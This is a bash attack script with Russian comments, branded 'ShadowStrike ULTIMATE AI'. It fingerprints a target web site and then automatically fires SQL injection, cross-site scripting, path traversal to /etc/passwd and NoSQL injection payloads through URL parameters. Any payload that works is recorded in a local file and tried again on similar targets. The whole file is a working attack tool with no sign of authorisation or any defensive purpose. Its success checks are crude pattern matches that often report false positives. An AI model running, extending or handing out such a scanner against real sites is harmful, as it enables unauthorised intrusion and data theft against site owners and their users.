#!/bin/bash
# ULTIMATE AI — Agentic + Autopilot в одном
TARGET=$1
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
BRAIN="$HOME/.shadow_brain"
mkdir -p "$BRAIN"

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike ULTIMATE AI                  ║"
echo "╚══════════════════════════════════════════════╝"

# Фаза 1: Определяем тип цели
echo "[AI] Phase 1: Target analysis..."
HTML=$(curl -sk --max-time 10 "$TARGET" 2>/dev/null)
HEADERS=$(curl -sk -I --max-time 10 "$TARGET" 2>/dev/null)

TARGET_TYPE="unknown"
echo "$HTML" | grep -qi "wp-content" && TARGET_TYPE="wordpress"
echo "$HTML" | grep -qi "graphql" && TARGET_TYPE="graphql"
echo "$HTML" | grep -qi "<form.*login" && TARGET_TYPE="login_form"
echo "$HEADERS" | grep -qi "Server:" && SERVER=$(echo "$HEADERS" | grep -i "Server:" | head -1)

echo "[AI] Target: $TARGET_TYPE | $SERVER"

# Фаза 2: Загружаем опыт
echo "[AI] Phase 2: Loading experience..."
ATTACKS_TO_TRY=""

if [ -f "$BRAIN/successful_attacks.txt" ]; then
    # Приоритет — атаки которые сработали на таком же типе целей
    grep "$TARGET_TYPE" "$BRAIN/successful_attacks.txt" 2>/dev/null > /tmp/ai_attacks.txt
    # Плюс универсальные атаки
    grep "universal" "$BRAIN/successful_attacks.txt" 2>/dev/null >> /tmp/ai_attacks.txt
    
    COUNT=$(wc -l < /tmp/ai_attacks.txt 2>/dev/null || echo 0)
    echo "[AI] Loaded $COUNT learned attacks"
else
    # Первый запуск — используем базовый набор
    echo "SQLi|universal|' OR '1'='1" > /tmp/ai_attacks.txt
    echo "XSS|universal|<script>alert(1)</script>" >> /tmp/ai_attacks.txt
    echo "LFI|universal|../../etc/passwd" >> /tmp/ai_attacks.txt
    echo "NoSQL|universal|{\$gt:\"\"}" >> /tmp/ai_attacks.txt
    echo "[AI] No experience — using basic attacks"
fi

# Фаза 3: Атака с обучением
echo "[AI] Phase 3: Attack + Learn..."
SUCCESS=0

while IFS='|' read type target_type payload; do
    [ -z "$payload" ] && continue
    
    echo "[AI] Trying $type: $payload"
    case "$type" in
        SQLi|universal)
            RESP=$(curl -sk --max-time 5 "$TARGET?id=$payload" 2>/dev/null)
            echo "$RESP" | grep -qi "sql\|error\|syntax\|ORA-\|mysql" && {
                echo "  ✅ SQLi WORKS!"
                echo "SQLi|$TARGET_TYPE|$payload" >> "$BRAIN/successful_attacks.txt"
                SUCCESS=$((SUCCESS+1))
            }
            ;;
        XSS)
            RESP=$(curl -sk --max-time 5 "$TARGET?q=$payload" 2>/dev/null)
            echo "$RESP" | grep -q "$payload" && {
                echo "  ✅ XSS WORKS!"
                echo "XSS|$TARGET_TYPE|$payload" >> "$BRAIN/successful_attacks.txt"
                SUCCESS=$((SUCCESS+1))
            }
            ;;
        LFI)
            RESP=$(curl -sk --max-time 5 "$TARGET?file=$payload" 2>/dev/null)
            echo "$RESP" | grep -q "root:" && {
                echo "  ✅ LFI WORKS!"
                echo "LFI|$TARGET_TYPE|$payload" >> "$BRAIN/successful_attacks.txt"
                SUCCESS=$((SUCCESS+1))
            }
            ;;
        NoSQL)
            RESP=$(curl -sk --max-time 5 "$TARGET?q=$payload" 2>/dev/null)
            echo "$RESP" | grep -qi "error\|exception\|unexpected" && {
                echo "  ✅ NoSQL WORKS!"
                echo "NoSQL|$TARGET_TYPE|$payload" >> "$BRAIN/successful_attacks.txt"
                SUCCESS=$((SUCCESS+1))
            }
            ;;
    esac
    sleep 0.5
done < /tmp/ai_attacks.txt

# Фаза 4: Итог
sort -u "$BRAIN/successful_attacks.txt" -o "$BRAIN/successful_attacks.txt" 2>/dev/null
echo ""
echo "[AI] ✅ Mission complete"
echo "[AI] Success: $SUCCESS | Total learned: $(wc -l < "$BRAIN/successful_attacks.txt" 2>/dev/null || echo 0)"
echo "[AI] Brain: $BRAIN/successful_attacks.txt"
